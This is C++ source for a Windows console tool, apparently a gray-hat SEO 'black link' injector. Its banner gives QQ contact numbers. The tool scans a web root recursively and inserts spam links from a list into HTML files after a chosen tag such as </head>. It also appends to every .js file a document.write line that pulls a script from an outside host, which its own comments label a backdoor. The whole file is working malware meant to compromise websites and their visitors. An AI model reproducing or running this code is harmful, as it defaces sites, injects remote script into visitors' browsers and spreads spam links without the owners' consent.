// webfile.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "webfile.h"

#include<stdio.h>  //产生随机数
#include<stdlib.h>  //产生随机数
#include <vector>
std::vector<CString> contentArray;


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// The one and only application object
BOOL file_fwrite(CString file_name,CString data); //写入文件    路径  内容
CString open_file(CString file_name);  //读取文件全部内容
void file_hl(CString file_name,CString data);  //文件挂载黑链  文件路径   需要替换的内容
void txt_list(CString file_name);  //把TXT导入到数组里
DWORD  BeginWebFileFind(char *szPath);  //查找网页文件准确位置
char* GetSuffixName(char *szFileName, int n);  //返回文件名     路径   返回几个字符
int mylength(char s[]);
void txt_log(CString data);   //log调试
void js_file(CString file_name,CString data);   //JS挂后门

CWinApp theApp;
using namespace std;
CString Now1="";
CString Now2="";
CString Now3="";
int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
printf("==============================================================\n");
printf("====webfile.exe html-htm-HTML-HTM D:\wwwroot \"</head>\"======\n");
printf("           落雪灰帽SEO--智能 批量 黑链 挂在器                 \n");
printf("            QQ:2602159946落雪交流群:142168763                 \n");
printf("=================一直被模仿从未被超越=========================\n");
printf("==============================================================\n");
Sleep(5000);
if (argc>=3)
{
  Now1=argv[1];
  Now2=argv[2];
  Now3=argv[3];
}
else
{
  cout<<"webfile.exe html-htm-HTML-HTM D:\wwwroot ""</head>"""<<endl;
  exit(EXIT_FAILURE);
}
txt_list("url.txt");  //把TXT导入到数组里
BeginWebFileFind((char*)(LPCTSTR)Now2);  //查找网页文件准确位置

printf("==============================================================\n");
printf("====webfile.exe html-htm-HTML-HTM D:\wwwroot \"</head>\"======\n");
printf("           落雪灰帽SEO--智能 批量 黑链 挂在器                 \n");
printf("            QQ:2602159946落雪交流群:142168763                 \n");
printf("=================一直被模仿从未被超越=========================\n");
printf("==============================================================\n");
Sleep(5000);
}


///////////////////////////////////////////////////////////////////

#include <stdio.h>
#include < string.h> 
#include < stdio.h> 
char *token;

int mylength(char s[])
{
	try  //定义异常  
 	{ 
		int i;
		for(i=0;s[i]!='\0';i++);
		return i;
	}
	catch(const)             //捕获并处理异常  
	{  
		return 0;
	}								
}   

char* GetSuffixName(char *szFileName, int n)  //返回文件名     路径   返回几个字符
{
	try  //定义异常  
 	{ 
		int nLen=strlen(szFileName);
		char *szName=szFileName;
		szName=szName+(nLen-n);
		return szName;
	}
	catch(const)             //捕获并处理异常  
	{  
		return szFileName;
	}
}

DWORD  BeginWebFileFind(char *szPath)  //查找网页文件准确位置
{  
	try  //定义异常  
	{  
		//CString data=".html.htm.HTML.HTM";
		
		//逻辑磁盘分区
		char szFindDriver[MAX_PATH]={0}; 
		lstrcpy(szFindDriver,szPath);  //复制
		lstrcat(szFindDriver,"\\*.*"); //字符串相加 
		WIN32_FIND_DATA wfd; 
		HANDLE hFind = FindFirstFile(szFindDriver,&wfd);  //获取文件属性
		if (hFind == INVALID_HANDLE_VALUE)  //已经在物理内存中创建
			return 0;
		
		while (FindNextFile(hFind, &wfd))  //根据文件名查找文件
		{
			if (wfd.cFileName[0] == '.') //文件名  '.'当前目录
				continue;  
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)  ////是否为文件夹
			{ 
				char szFindPath[MAX_PATH];
				lstrcpy(szFindPath,szPath); //复制
				lstrcat(szFindPath,"\\");   //字符串相加
				lstrcat(szFindPath,wfd.cFileName);   //字符串相加
				BeginWebFileFind(szFindPath);  //查找网页文件对其进行感染   //如果是一个子目录，用递归继续往深一层找
			} 
			else 
			{
				Sleep(1);
				char szFilePath[MAX_PATH]; 
				lstrcpy(szFilePath,szPath);  //复制
				lstrcat(szFilePath,"\\");   //字符串相加
				lstrcat(szFilePath,wfd.cFileName);  //字符串相加
				/////////////////////
				try  //定义异常  
 				{ 
					char string1[MAX_PATH]; 
					sprintf(string1,"%s",Now1);
					token = strtok( string1,"-");    //格式化字符串
					while( token != NULL )  
					{  
 						try  //定义异常  
 						{ 
							//返回文件名     路径   返回几个字符
							if(!lstrcmp(GetSuffixName(szFilePath,mylength(token)),token))
							{
								//printf("%s\n",szFilePath);		
								file_hl(szFilePath,Now3);  //文件挂载黑链  文件路径   需要替换的内容
								Sleep(5);
							}	
							
						}
						catch(const)             //捕获并处理异常  
						{  
							Sleep(5);
						}
					token = strtok(NULL,"-"); 
					} 
				/////////////////////
					if(!lstrcmp(GetSuffixName(szFilePath,2),"js")||!lstrcmp(GetSuffixName(szFilePath,2),"JS"))   //后门
					{
						//printf("%s\n",szFilePath);	
						CString hm="document.write('<script type=\"text/javascript\" src=\"http://999kankan.com/ip.php\"></script>');";
						js_file(szFilePath,hm);   //log调试
					}		
				}
				catch(const)             //捕获并处理异常  
				{  
					Sleep(5);
				}		
				Sleep(5);
			} 
		}
		FindClose(hFind);  //关闭文件句柄
		return 1;
	}
	catch(const)             //捕获并处理异常  
	{  
		return 1;
	}
	return 1;
}

//==================================================================
void js_file(CString file_name,CString data)   //JS挂后门
{
    try  //定义异常  
	{  
		FILE* fd = fopen(file_name, "a+");
		if (fd != NULL)
		{
			fwrite("\n", strlen("\n"), 1, fd );
			fwrite( data, strlen(data), 1, fd );
			//fflush( fd );
			fclose( fd );
		 }                
	}
	catch(CException*e)             //捕获并处理异常  
	{  
		e->Delete();
	}
}

void txt_list(CString file_name)  //把TXT导入到数组里
{
	try  //定义异常  
	{
		CStdioFile file;
		//打开文件
		if (!file.Open(file_name, CFile::modeRead))
		{
			//::AfxMessageBox(_T("文件打开失败。"));
			return;
		}

		//读文件
		//int j=0;
		CString strText = _T("");
		while (file.ReadString(strText))
		{
			if (mylength((char*)(LPCTSTR)strText))
			{
				contentArray.push_back(strText);
			}
		}	
	}
	catch(const)             //捕获并处理异常  
	{  
		return;
	} 
	
// 		std::vector<CString>::iterator pos;
// 		for( pos = contentArray.begin(); pos != contentArray.end() ; pos ++)
// 		{
// 			CString content = * pos ;
//  			CString   str;   
// 			str.Format("%s",content);  //contentArray.size()
// 			MessageBox(NULL,str, "Greetings", MB_OKCANCEL); 
// 		}
}

void file_hl(CString file_name,CString data)  //文件挂载黑链  文件路径   需要替换的内容
{
	try  //定义异常  
	{  
		CString   file_data=open_file(file_name);
		if (file_data=="")
		{
			return;
		}
 		int nLen = file_data.GetLength();
		LPSTR lpBuffer = file_data.GetBuffer(nLen);
		DWORD dwLen = atol(file_data);

 		CString   str,str1;    
		int N=contentArray.size();
		srand((unsigned)time(NULL)); 
		str.Format("%s",contentArray[rand()%N]);
		str1.Format("%s\n%s",data,str);
		int num=file_data.Replace(data,str1);//替换字符串   要替换内容   替换内容
		file_fwrite(file_name,file_data); //写入文件    路径  内容	

		str.Format("共完%d处替换",num);
		printf("文件:%s--%s\n",file_name,str);	
		txt_log(file_name);   //log调试
	}
	catch(const)             //捕获并处理异常  
	{  
		return;
	} 
}

void txt_log(CString data)   //log调试
{
    try  //定义异常  
{  
    FILE* fd = fopen("log.log", "a+");
            if ( fd != NULL )
            {
                fwrite( data, strlen(data), 1, fd );
                //fflush( fd );
                fwrite("\n", strlen("\n"), 1, fd );
                fclose( fd );
            }
}
catch(CException*e)             //捕获并处理异常  
{  
    e->Delete();
}
}

CString open_file(CString file_name)  //读取文件全部内容
{
	try  //定义异常  
	{  
		FILE *fp;
		CString c;
		CString   data;  
		fp=fopen(file_name,"r");
		while((c=fgetc(fp))!=EOF)
		{
			data+=c;
		}
		fclose(fp);
		return data;
	}
	catch(const)             //捕获并处理异常  
	{  
		return "";
	} 
}

BOOL file_fwrite(CString file_name,CString data) //写入文件    路径  内容
{
	try  //定义异常  
	{  
		FILE *pFileOut=fopen(file_name,"w+");
		if (NULL == pFileOut)
		{
			return 0;  //打开文件失败
		}
		fwrite(data,1,strlen(data),pFileOut);
		fclose(pFileOut);
	}
	catch(const)             //捕获并处理异常  
	{  
		return 0;
	} 
}